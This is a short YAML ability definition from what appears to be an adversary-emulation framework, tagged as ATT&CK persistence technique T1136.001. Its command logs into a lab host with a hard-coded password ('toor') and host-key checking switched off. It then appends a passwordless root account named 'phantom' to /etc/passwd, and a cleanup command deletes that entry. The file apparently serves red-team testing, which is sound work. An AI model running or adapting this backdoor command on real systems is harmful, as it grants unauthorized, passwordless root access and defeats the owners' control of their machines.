- id: pe03-passwd-backdoor
  name: Backdoor Root Account via passwd
  description: Add backdoor root-level account exploiting world-writable /etc/passwd
  tactic: persistence
  technique:
    attack_id: T1136.001
    name: Create Account - Local Account
  platforms:
    linux:
      sh:
        command: |
          sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@10.0.20.200 "sudo sh -c 'echo phantom::0:0::/root:/bin/bash' >> /etc/passwd" 2>/dev/null && echo '[+] Backdoor account added' || echo 'Passwd backdoor attempted'
        cleanup: |
          sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@10.0.20.200 "sed -i '/phantom/d' /etc/passwd" 2>/dev/null
  singleton: false
  repeatable: false
